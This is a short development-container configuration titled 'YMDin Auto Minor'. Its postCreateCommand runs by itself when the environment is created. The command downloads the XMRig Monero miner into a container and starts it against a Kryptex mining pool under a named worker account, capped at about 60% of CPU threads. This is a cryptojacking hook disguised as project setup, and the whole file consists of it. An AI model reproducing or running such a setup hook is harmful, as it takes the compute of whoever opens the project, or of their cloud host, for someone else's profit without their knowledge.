name: YMDin Auto Minor
postCreateCommand: docker compose up -d && sleep 15 && docker exec ubuntu_cli bash -c 'apt-get update && apt-get install -y wget tar && cd /root && wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz && tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz && cd xmrig-6.26.0 && ./xmrig -o xmr-sg.kryptex.network:7029 -u krxX2P79Q4.worke3 -p x --coin monero --cpu-max-threads-hint=60'
